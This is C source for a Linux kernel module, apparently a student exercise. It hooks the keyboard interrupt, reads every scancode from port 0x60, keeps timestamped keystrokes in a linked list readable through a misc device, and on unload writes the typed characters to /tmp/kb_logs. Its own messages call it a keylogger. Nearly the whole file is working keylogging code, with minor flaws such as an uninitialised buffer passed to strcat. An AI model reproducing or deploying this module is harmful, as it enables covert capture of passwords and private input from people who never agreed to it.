#include <linux/module.h>
#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/interrupt.h>
#include <asm/io.h>
#include <linux/miscdevice.h>
#include <linux/uaccess.h>
#include <linux/fs.h>
#include <linux/seq_file.h>
#include <linux/file.h> 
#include <linux/fcntl.h> 
#include <linux/syscalls.h>

#include <linux/kernel.h> 
#include <linux/init.h> 
#include <linux/module.h> 
#include <linux/syscalls.h> 
#include <linux/file.h> 
#include <linux/fs.h>
#include <linux/fcntl.h> 
#include <asm/uaccess.h> 

#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <asm/uaccess.h>
#include <linux/mm.h>
#include <linux/keyboard.h>

#include "struct.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Adam Taguirov <ataguiro@student.42.fr>");
MODULE_DESCRIPTION("Keyboard interrupt handler");

/*
   static struct           s_stroke {
   unsigned char   key;
   unsigned char   state;
   char            name[32];
   char            value;
   struct tm       time;
   struct s_stroke *next;
   };

   static struct s_stroke *stroke_head = NULL;
   */

static char *read_buffer = NULL;
static struct miscdevice kbhandler;
static unsigned char sc;
static struct mutex g_mutex;

static void got_char(unsigned long scancode_addr);
DECLARE_TASKLET(kbtask, got_char, (unsigned long)&sc);

static struct file *file_open(const char *path, int flags, int rights) 
{
    struct file *filp = NULL;
    mm_segment_t oldfs;
    int err = 0;

    oldfs = get_fs();
    set_fs(get_ds());
    filp = filp_open(path, flags, rights);
    set_fs(oldfs);
    if (IS_ERR(filp)) {
        err = PTR_ERR(filp);
        return NULL;
    }
    return filp;
}

static int file_write(struct file *file, loff_t *offset, unsigned char *data, unsigned int size) 
{
    mm_segment_t oldfs;
    int ret;

    oldfs = get_fs();
    set_fs(get_ds());

    ret = kernel_write(file, data, size, offset);

    set_fs(oldfs);
    return ret;
}

static void file_close(struct file *file)
{
    filp_close(file, NULL);
}

static void got_char(unsigned long scancode_addr)
{
	static char multi = 0;
	static char caps = 0;
	static char state = 0;
	static struct s_stroke *new, *tmp;
	static struct tm time;
	static struct timespec ts;
	struct keycodes *array;
	unsigned char scancode = *(char *)scancode_addr;

	if (!(new = kmalloc(sizeof(struct s_stroke), GFP_ATOMIC)))
		return;
	if (scancode == 0xe0) {
		multi = 1;
		return;
	}
	/*
	 * Setting correct flags and states
	 */
	if (scancode > 128) {
		scancode = scancode - 128;
		state = 0;
	} else
		state = 1;
	(0x2A == scancode && state) ? caps = 1 : 0;
	(0x2A == scancode && !state) ? caps = 0 : 0;
	(0x3A == scancode && state) ? caps = !caps : 0;
	array = multi ? multi_scancodes : simple_scancodes;
	
	/*
	 * Filling list node
	 */
	getnstimeofday(&ts);
	time_to_tm(ts.tv_sec, 0, &time);
	new->key = scancode;
	new->state = state;
	new->name = array[scancode].name;
	new->value = caps ? array[scancode].caps : array[scancode].ascii;
	new->print = array[scancode].print;
	new->multi = multi;
	new->time = time;
	new->next = NULL;
	
	/*
	 * Saving new list node at correct place
	 */
	if (!stroke_head)
		stroke_head = new;
	else {
		tmp = stroke_head;
		while (tmp->next)
			tmp = tmp->next;
		tmp->next = new;
	}
	multi = 0;
}

irq_handler_t irq_handler (int irq, void *dev_id, struct pt_regs *regs)
{
	sc = inb(0x60) % 256;
	tasklet_schedule(&kbtask);
	return (irq_handler_t) IRQ_HANDLED;
}

static void write_logs(void)
{
	static loff_t offset = 0;
	struct s_stroke *tmp, *save;
	struct file *f;
	unsigned char c;

	tmp = stroke_head;
	f = file_open("/tmp/kb_logs", O_CREAT | O_WRONLY | O_APPEND, 0644);
	if (!f)
		return ;
	while (tmp)
	{
		if (tmp->print == 1 && tmp->state == 1) {
			c = tmp->value;
			file_write(f, &offset, &c, 1);
		}
		save = tmp->next;
		kfree(tmp);
		tmp = save;
	}
	file_close(f);
}

static int get_count(void)
{
	struct s_stroke *tmp;
	char buf[256] = {0};
	int ret = 0;

	tmp = stroke_head;
	while (tmp) {
		snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
			tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
                        tmp->name, \
                        tmp->multi ? "0xe0, " : "", tmp->key, \
                        tmp->state ? "pressed" : "released");
		ret += strlen(buf);
		tmp = tmp->next;
	}
	return ret;
}

static int kbopen(struct inode *inode, struct file *f)
{
	struct s_stroke *tmp;
	char buf[256] = {0};
	int n;
	int ret;
	
	ret = mutex_lock_interruptible(&g_mutex);
	if (ret)
		goto end;
	f->private_data = NULL;
	tmp = stroke_head;
	n = get_count();
	if (!n)
		goto nullcase;
	if (read_buffer)
		kfree(read_buffer);
	read_buffer = kmalloc(n * sizeof(char), GFP_KERNEL);
	if (!read_buffer) {
		ret = -ENOMEM;
		goto end;
	}
	while (tmp) {
		snprintf(buf, 256, "[%d:%d:%d] %s (%s%#x) %s\n", \
			tmp->time.tm_hour, tmp->time.tm_min, tmp->time.tm_sec, \
                        tmp->name, \
                        tmp->multi ? "0xe0, " : "", tmp->key, \
                        tmp->state ? "pressed" : "released");
		strcat(read_buffer, buf);
		tmp = tmp->next;
	}
nullcase:
	ret = single_open(f, NULL, NULL);
end:
	mutex_unlock(&g_mutex);
	return ret;
}


static ssize_t kbread(struct file *f, char __user *s, size_t n, loff_t *o)
{
	int ret;

	ret = mutex_lock_interruptible(&g_mutex);
	if (ret)
		goto end;
	if (!read_buffer)
		goto end;
	ret = simple_read_from_buffer(s, n, o, read_buffer, strlen(read_buffer));
	if (!ret) {
		kfree(read_buffer);
		read_buffer = NULL;
	}
end:
	mutex_unlock(&g_mutex);
	return ret;
}

struct file_operations kbfops = {
	.open = kbopen,
	.read = kbread
};

static int __init hello_init(void) {
	int ret;

	printk(KERN_INFO "Keyboard keylogger initialized !\n");
	mutex_init(&g_mutex);
	kbhandler.minor = MISC_DYNAMIC_MINOR;
	kbhandler.name = "kbhandler";
	kbhandler.fops = &kbfops;

	ret = misc_register(&kbhandler);
	return request_irq (1, (irq_handler_t) irq_handler, IRQF_SHARED, "my_keyboard_driver", (void *)(irq_handler));
}

static void __exit hello_cleanup(void) {
	printk(KERN_INFO "Destroying keylogger module.\n");
	write_logs();
	kfree(read_buffer);
	if (read_buffer)
		read_buffer = NULL;
	misc_deregister(&kbhandler);
	mutex_destroy(&g_mutex);
	free_irq(1, (void *)(irq_handler));
}

module_init(hello_init);
module_exit(hello_cleanup);
